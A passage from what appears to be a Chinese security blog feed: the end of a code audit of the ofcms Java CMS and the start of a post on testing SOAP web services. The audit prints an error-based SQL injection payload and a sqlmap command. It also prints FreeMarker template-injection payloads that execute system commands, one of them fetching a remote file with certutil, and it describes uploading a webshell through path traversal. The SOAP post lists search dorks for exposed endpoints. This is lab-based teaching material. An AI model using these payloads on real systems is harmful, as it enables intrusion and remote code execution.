data-caption="image-20221019232519216"><img src="/../images/Java/ofcms/image-20221019232519216.png" alt="image-20221019232519216"></a></p><p>小结：这一部分的环境搭建坑点很多，主要还是卡在一些小细节。注意，解决重装bug记得要先把数据库连接地址改为 <code>localhost</code>（重要），然后安装一遍，让数据库生成相应的表格，然后将<code>db-config.properties</code> 改为 <code>db.properties</code>，然后重新运行即可。</p><h2 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h2><h3 id="1、源码分析"><a href="#1、源码分析" class="headerlink" title="1、源码分析"></a>1、源码分析</h3><p>开始审计前，大概了解程序框架，整个程序一共有五个模块组成，根据  <code>Readme</code> 可知其对应的作用</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010225802.png" data-caption="image-20221020010225802"><img src="/../images/Java/ofcms/image-20221020010225802.png" alt="image-20221020010225802"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010344368.png" data-caption="image-20221020010344368"><img src="/../images/Java/ofcms/image-20221020010344368.png" alt="image-20221020010344368"></a></p><p>然后，我们查看 <code>pom.xml</code> ,<code>&lt;dependencies&gt;</code> 部分，即依赖。分析其程序使用了哪些框架，或应用版本是哪些，对我们后续审计有一定的作用。如下为 <code>ofcms v1.1.3</code> <code>pom.xml</code>文件，依赖如下，由信息可知程序信息有 <code>jfinal</code> 框架、<code>slf4j</code> 日志框架、<code>Apache</code> 中间件、<code>springframework</code> 框架、<code>Druid 1.0.5</code>、<code>fastjson 1.1.41</code>、<code>log4j 1.2.16</code>、<code>mysql 5.1.47</code>等信息，后续也可以对该程序进行已知漏洞的测试</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010007868.png" data-caption="image-20221020010007868"><img src="/../images/Java/ofcms/image-20221020010007868.png" alt="image-20221020010007868"></a></p><p>通过查看源码得知，程序使用了 <code>tomcat</code> ，而代码对应存在 <code>web.xml</code> 配置文件，我们分析其配置文件，看有没有其它的信息。例子：通过 <code>web.xml</code> 得知 <code>druid</code> 路径为 <code>/admin/druid/</code>,若存在未授权则可以访问，但 <code>admin</code> 路径为后台路径，所以需要登录才能访问</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010940740.png" data-caption="image-20221020010940740"><img src="/../images/Java/ofcms/image-20221020010940740.png" alt="image-20221020010940740"></a></p><p>尝试访问 <code>/admin/druid/*</code>，跳转至登录页面</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011132305.png" data-caption="image-20221020011132305"><img src="/../images/Java/ofcms/image-20221020011132305.png" alt="image-20221020011132305"></a></p><p>登录后访问。这只是一个例子，通过配置文件找寻一些有用的信息</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011211309.png" data-caption="image-20221020011211309"><img src="/../images/Java/ofcms/image-20221020011211309.png" alt="image-20221020011211309"></a></p><p>然后我们通过一下源码，大概了解程序结构，以及相应代码文件夹的源码作用是哪些，一般我们查看文件夹下的 <code>/src/java</code> 目录下的源码即可。<code>Controller</code> 源码对应 <code>resources</code>，我们可以通过 <code>Controller</code> 分析其请求状况，然后到 <code>resources</code> 中查看其具体代码。</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020012651194.png" data-caption="image-20221020012651194"><img src="/../images/Java/ofcms/image-20221020012651194.png" alt="image-20221020012651194"></a></p><p>最后，每个代码页面浏览一下，通过代码结构和注释等信息了解大概的结构。基本知识点请移步站内文章<a href="https://funsiooo.github.io/2022/10/02/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">《JAVA代码审计(三)-基础知识》</a></p><h3 id="2、漏洞审计"><a href="#2、漏洞审计" class="headerlink" title="2、漏洞审计"></a>2、漏洞审计</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>这里使用白盒测试，通过分析后测试漏洞点，<code>后台-》代码生成-》</code>,随便输入字符，报错</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015034179.png" data-caption="image-20221020015034179"><img src="/../images/Java/ofcms/image-20221020015034179.png" alt="image-20221020015034179"></a></p><p>为了显示得更直观，这里利用 Burp 抓包</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015121559.png" data-caption="image-20221020015121559"><img src="/../images/Java/ofcms/image-20221020015121559.png" alt="image-20221020015121559"></a></p><p>验证测试 payload：<br><code>update+of_cms_link+set+link_name%3dupdatexml(1,concat(0x7e,(user())),0)+where+link_id+%3d+4</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000529612.png" data-caption="image-20221020000529612"><img src="/../images/Java/ofcms/image-20221020000529612.png" alt="image-20221020000529612"></a></p><p>简单复现，祭出神器 Sqlmap  <code>python sqlmap.py -r ofcms.txt -p sql --level 3 --dbs</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000923745.png" data-caption="image-20221020000923745"><img src="/../images/Java/ofcms/image-20221020000923745.png" alt="image-20221020000923745"></a></p><p>漏洞分析，定位漏洞位置源码。通过 Burp 中发现 <code>referer 中system/generate</code>，源码中定位该代码文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021417891.png" data-caption="image-20221020021417891"><img src="/../images/Java/ofcms/image-20221020021417891.png" alt="image-20221020021417891"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020122144.png" data-caption="image-20221020020122144"><img src="/../images/Java/ofcms/image-20221020020122144.png" alt="image-20221020020122144"></a></p><p>全局搜索，定位代码位置<br><code>\ofcms\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemGenerateController.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020637848.png" data-caption="image-20221020020637848"><img src="/../images/Java/ofcms/image-20221020020637848.png" alt="image-20221020020637848"></a></p><p>其中通过分析代码，发现漏洞点参数 <code>sql</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a></p><p>跟进 <code>getPara()</code> 方法，查看具体返回方式， <code>Ctrl + 鼠标左键</code>，由下图代码可知，程序没有对 <code>sql</code> 参数进行过滤，<code>getPara()</code> 请求后，系统直接将返回请求的参数</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021029645.png" data-caption="image-20221020021029645"><img src="/../images/Java/ofcms/image-20221020021029645.png" alt="image-20221020021029645"></a></p><p>若不知道漏洞点，进行漏洞点追踪定位代码。比如我们通过审计追踪代码，发现<code>/system/generate</code> 路径下 <code>sql</code> 参数没有进行过滤，可能存在注入漏洞</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021928106.png" data-caption="image-20221020021928106"><img src="/../images/Java/ofcms/image-20221020021928106.png" alt="image-20221020021928106"></a></p><p>根据现有信息，我们知道，漏洞点参数为 <code>sql</code>，路径为 <code>/system/generate/</code>，向上追踪路径为 <code>/admin/system/generate</code>，综合所得，通过 Burp 代理抓包，点击功能点，查看哪个页面为 <code>/admin/system/generate</code> 且存在输入点参数 <code>sql</code>，则进行测试即可</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022215661.png" data-caption="image-20221020022215661"><img src="/../images/Java/ofcms/image-20221020022215661.png" alt="image-20221020022215661"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022414193.png" data-caption="image-20221020022414193"><img src="/../images/Java/ofcms/image-20221020022414193.png" alt="image-20221020022414193"></a></p><h4 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h4><p>由 pom.xml 中发现存在 FreeMarker 模板引擎的依赖，该模板存在模板注入,尝试进行复现</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021000447406.png" data-caption="image-20221021000447406"><img src="/../images/Java/ofcms/image-20221021000447406.png" alt="image-20221021000447406"></a></p><p>漏洞点为模板文件处</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002005057.png" data-caption="image-20221021002005057"><img src="/../images/Java/ofcms/image-20221021002005057.png" alt="image-20221021002005057"></a></p><p>我们可以修改模板文件内容插入恶意语句，触发系统命令执行。如下插入恶意语句执行系统命令促使弹出计算器</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;calc&quot;) &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021003322351.png" data-caption="image-20221021003322351"><img src="/../images/Java/ofcms/image-20221021003322351.png" alt="image-20221021003322351"></a></p><p>保存后，访问主页触发命令，因为编辑的模板为主页样式模板</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002215557.png" data-caption="image-20221021002215557"><img src="/../images/Java/ofcms/image-20221021002215557.png" alt="image-20221021002215557"></a></p><p>通过 Burp 定位到漏洞代码，<code>/ofcms_admin_war/admin/cms/template</code> 路径下的 <code>file_content</code> 参数</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002555604.png" data-caption="image-20221021002555604"><img src="/../images/Java/ofcms/image-20221021002555604.png" alt="image-20221021002555604"></a></p><p>对应控制处理方法为 <code>com.ofsoft.cms.admin.controller.cms.TemplateController 类中的save方法</code>，从下图可以看出来，其实代码有对 <code>fileContent</code> 内容进行替换，但没有进行过滤，replace() 的使用方法为 <code>字符串.replace(String oldChar, String newChar)</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002943097.png" data-caption="image-20221021002943097"><img src="/../images/Java/ofcms/image-20221021002943097.png" alt="image-20221021002943097"></a></p><p>我们跟进 <code>getRequest()</code>方法 <code>Ctrl + 鼠标左键</code>，查看具体返回,由下图可知，直接对返回 <code>request</code> 请求，没有任何过滤</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021005342147.png" data-caption="image-20221021005342147"><img src="/../images/Java/ofcms/image-20221021005342147.png" alt="image-20221021005342147"></a></p><p>漏洞原因为：<code>FreeMarker</code> 提供高级内置函数，导致攻击者可以构造语句去实现攻击，其中引擎模板中存在能够执行的类是主要能构造命令执行的原因，官方文档 <code>http://freemarker.foofun.cn/ref_builtins_expert.html</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012934815.png" data-caption="image-20221021012934815"><img src="/../images/Java/ofcms/image-20221021012934815.png" alt="image-20221021012934815"></a></p><p>由于我这里找不到具体的代码，所以就不显示了。贴出网上的payload如下</p><p>构造方法一：<br><code>freemarker.template.utility</code> 中的 <code>Execute 类</code> ,利用new函数新建一个Execute类,传输我们要执行的命令作为参数，构造远程命令。 </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure></div><br/><p>构造方法二：<br><code>freemarker.template.utility</code> 中的 <code>ObjectConstructor类</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br></pre></td></tr></table></figure></div><br/><p>构造方法三：<br><code>freemarker.template.utility</code> 中的 <code>JythonRuntime类</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure></div><br/><p>具体语句解析，原始：<code>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;</code>，利用 <code>Execute</code> 类构造恶意语句 <code>&lt;#assign xxx= &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;xxx(&quot;calc&quot;)&#125;</code>，其中xxx为相同的字符，亲测数字不能触发语句，<code>freemarker.template.utility.Execute</code> 为 freemarker 模板引擎的</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014155077.png" data-caption="image-20221021014155077"><img src="/../images/Java/ofcms/image-20221021014155077.png" alt="image-20221021014155077"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014135817.png" data-caption="image-20221021014135817"><img src="/../images/Java/ofcms/image-20221021014135817.png" alt="image-20221021014135817"></a></p><p>尝试利用 <code>certutil.exe</code> 远程下载文件，远程服务器文件内容只是123456，但由于使用了 <code>certutil</code> 命令，系统会拦截</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; </span><br><span class="line">  $&#123; ex(&quot;certutil -urlcache -split -f http://x.x.x.x:2333/ssti.txt ssti.exe&quot;) &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012311523.png" data-caption="image-20221021012311523"><img src="/../images/Java/ofcms/image-20221021012311523.png" alt="image-20221021012311523"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012141523.png" data-caption="image-20221021012141523"><img src="/../images/Java/ofcms/image-20221021012141523.png" alt="image-20221021012141523"></a></p><p>把防护关了以后，会下载到 tomcat 的目录下。所以实战中得考虑，绕过主机防护设备，马儿得免杀</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012506146.png" data-caption="image-20221021012506146"><img src="/../images/Java/ofcms/image-20221021012506146.png" alt="image-20221021012506146"></a></p><h4 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h4><p>漏洞点同样在 <code>SSTI</code> 漏洞位置中的 <code>save</code> 函数中</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021020833483.png" data-caption="image-20221021020833483"><img src="/../images/Java/ofcms/image-20221021020833483.png" alt="image-20221021020833483"></a></p><p>首先从前台获取 <code>file_name、file_content</code> 两个参数，该函数的 <code>file_name</code> 是直接和 <code>pathfile</code> 目录拼接，导致可以路径穿越，文件可以写到任意位置</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021122226.png" data-caption="image-20221021021122226"><img src="/../images/Java/ofcms/image-20221021021122226.png" alt="image-20221021021122226"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021309015.png" data-caption="image-20221021021309015"><img src="/../images/Java/ofcms/image-20221021021309015.png" alt="image-20221021021309015"></a></p><p>获取接口</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022029123.png" data-caption="image-20221021022029123"><img src="/../images/Java/ofcms/image-20221021022029123.png" alt="image-20221021022029123"></a></p><p>构造查询</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022429063.png" data-caption="image-20221021022429063"><img src="/../images/Java/ofcms/image-20221021022429063.png" alt="image-20221021022429063"></a></p><p>上传 <code>Webshell</code> 至 <code>static</code> 目录</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033127359.png" data-caption="image-20221021033127359"><img src="/../images/Java/ofcms/image-20221021033127359.png" alt="image-20221021033127359"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033310849.png" data-caption="image-20221021033310849"><img src="/../images/Java/ofcms/image-20221021033310849.png" alt="image-20221021033310849"></a></p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><p>在 <code>ComnController.java</code> 和 <code>UeditorAction.java</code> 文件下存在多个上传接口，其中 <code>upload</code>、<code>editUploadImage</code>、<code>uploadImage</code>、<code>uploadFile</code>、<code>uploadVideo</code> 和 <code>uploadScrawl</code> 函数均使用了，这里环境接口有问题，导致无法上传图片，所以就无法复现</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034750952.png" data-caption="image-20221021034750952"><img src="/../images/Java/ofcms/image-20221021034750952.png" alt="image-20221021034750952"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034529451.png" data-caption="image-20221021034529451"><img src="/../images/Java/ofcms/image-20221021034529451.png" alt="image-20221021034529451"></a></p><p>跟进后没有发现过滤，由于参考文章中能跟进到 <code>MultipartRequest</code> 函数中去，这里由于笔者水平有限，加上环境也许有点问题，导致无法跟进到最后，后续有机会再学习一下</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021040448644.png" data-caption="image-20221021040448644"><img src="/../images/Java/ofcms/image-20221021040448644.png" alt="image-20221021040448644"></a></p><h2 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a>四、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://forum.butian.net/share/1229</span><br><span class="line">https://blog.csdn.net/Alexz__/article/details/116229266</span><br><span class="line">https://www.secpulse.com/archives/185233.html</span><br><span class="line">https://blog.csdn.net/YouthBelief/article/details/122978328</span><br><span class="line">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Service接口测试之SOAP</title>
      <link href="/2022/10/16/Web%20Service%20%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%20SOAP/"/>
      <url>/2022/10/16/Web%20Service%20%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%20SOAP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、Web-Service-概述"><a href="#一、Web-Service-概述" class="headerlink" title="一、Web Service 概述"></a>一、Web Service 概述</h2><p>WebService 是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。即 JAVA 应用程序可以通过 websrvice 调用 PHP 或者 Python 等程序提供的服务。WebService 三要素：SOAP、WSDL、UDDI。</p><h3 id="WebService-三要素："><a href="#WebService-三要素：" class="headerlink" title="WebService 三要素："></a><strong>WebService 三要素：</strong></h3><p><code>SOAP（简单对象访问协议） </code>是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换，是连接或 Web 服务或客户端和 Web 服务之间的接口。简单地说就是，SOAP 是用于访问网络服务的协议。</p><p><code>WSDL</code>用来描述如何访问具体的接口。告诉调用者应该怎么填写SOAP当中的XML文件里面的内容。服务端具体提供了什么服务，该怎么调用这个服务，该传递什么类型的参数。会返回什么类型的数据等等。</p><p><code>UDDI</code> 用来管理，分发，查询 WebService。</p><h2 id="二、SOAP-简述"><a href="#二、SOAP-简述" class="headerlink" title="二、SOAP 简述"></a>二、SOAP 简述</h2><p>SOAP 消息组成部分：所有的 SOAP 消息都使用 XML 编码，一条 SOAP 消息就是一个普通的 XML 文档，该文档包括下列元素。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Envelope（信封）元素，必选，可把此 XML 文档标识为一条 SOAP 消息。</span><br><span class="line">Header（报头）元素，可选，包含头部信息（包含了使消息在到达最终目的地之前，能够被路由到一个或多个中间节点的信息）。</span><br><span class="line">Body(主体)元素，必选，包含所有的调用和响应信息。</span><br><span class="line">Fault 元素，位于 Body 内，可选，提供有关处理此消息所发生错误的信息。</span><br><span class="line">Attachment（附件）元素，可选，可通过添加一个或多个附件扩展 SOAP 消息。</span><br></pre></td></tr></table></figure></div><p>SOAP 消息格式例子</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:soap</span>=<span class="string">&quot;http://www.w3.org/2001/12/soap-envelope&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">soap:encodingStyle</span>=<span class="string">&quot;http://www.w3.org/2001/12/soap-encoding&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="三、SOAP-接口漏洞"><a href="#三、SOAP-接口漏洞" class="headerlink" title="三、SOAP 接口漏洞"></a>三、SOAP 接口漏洞</h2><p>SOAP 型 Web Service 漏洞类型与 Web 漏洞类型区别不太，只是请求的 payload 构造需要满足一些格式要求，具体要看Web Service服务端代码编写情况。漏洞类型比如命令注入、SQL注入、XSS、XXE、XPath注入、DoS、逻辑漏洞、信息泄露……等等。</p><p>如下为一个员工资料查询功能，其中<code>&lt;wkno&gt;string&lt;/wkno&gt;</code> <code>&lt;dept&gt;string&lt;/dept&gt;</code> <code>&lt;memo&gt;string&lt;/memo&gt;</code>  <code>&lt;status&gt;string&lt;/status&gt;</code> <code>&lt;sex&gt;string&lt;/sex&gt;</code> <code>&lt;agefilter&gt;string&lt;/agefilter&gt;</code> <code>&lt;name&gt;string&lt;/name&gt;</code> <code>&lt;token&gt;string&lt;/token&gt;</code> 为用户输入的数据,可作为测试点进行漏洞测试。</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /Service1.asmx HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Content-Length: length</span><br><span class="line">SOAPAction: &quot;http://x.x.x.x&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr_ygzlcx</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://x.x.x.x&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">wkno</span>&gt;</span>string<span class="tag">&lt;/<span class="name">wkno</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dept</span>&gt;</span>string<span class="tag">&lt;/<span class="name">dept</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">memo</span>&gt;</span>string<span class="tag">&lt;/<span class="name">memo</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">status</span>&gt;</span>string<span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">sex</span>&gt;</span>string<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">agefilter</span>&gt;</span>string<span class="tag">&lt;/<span class="name">agefilter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>string<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">token</span>&gt;</span>string<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hr_ygzlcx</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>例如在网页上发现存在 SOAP 接口，我们就可以对其输入点进行测试。</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016151628400.png" data-caption="image-20221016151628400"><img src="/../images/soap/image-20221016151628400.png" alt="image-20221016151628400"></a></p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016164820032.png" data-caption="image-20221016164820032"><img src="/../images/soap/image-20221016164820032.png" alt="image-20221016164820032"></a></p><p>测试的时候我们会遇到 xxx?WSDL 页面，这时候我们就可以利用 Burp 插件 Wsdler 提取接口进行测试。</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016154746376.png" data-caption="image-20221016154746376"><img src="/../images/soap/image-20221016154746376.png" alt="image-20221016154746376"></a></p><p>burp 商店安装 Wsdler 插件</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016152601142.png" data-caption="image-20221016152601142"><img src="/../images/soap/image-20221016152601142.png" alt="image-20221016152601142"></a></p><p>找到 asmx?WSDL 页面，抓取数据包直接右键 Extensions 处提取接口</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016155316639.png" data-caption="image-20221016155316639"><img src="/../images/soap/image-20221016155316639.png" alt="image-20221016155316639"></a></p><p>成功提取数据接口，接下来就可以进行漏洞测试</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016155642151.png" data-caption="image-20221016155642151"><img src="/../images/soap/image-20221016155642151.png" alt="image-20221016155642151"></a></p><h2 id="四、搜索-Web-Service-服务"><a href="#四、搜索-Web-Service-服务" class="headerlink" title="四、搜索 Web Service 服务"></a>四、搜索 Web Service 服务</h2><p>Google 指定搜索 Web Service 服务,如下所示，指定站点时可在前面添加 site:x.x.x.x</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">filetype:asmx inurl:(_vti_bin | api | webservice | ws )</span><br><span class="line">inurl:dll?wsdl filetype:dll</span><br><span class="line">inurl:jws?wsdl</span><br><span class="line">inurl:asmx?wsdl</span><br><span class="line">inurl:aspx?wsdl</span><br><span class="line">inurl:ascx?wsdl</span><br><span class="line">inurl:ashx?wsdl</span><br><span class="line">inurl:dll?wsdl</span><br><span 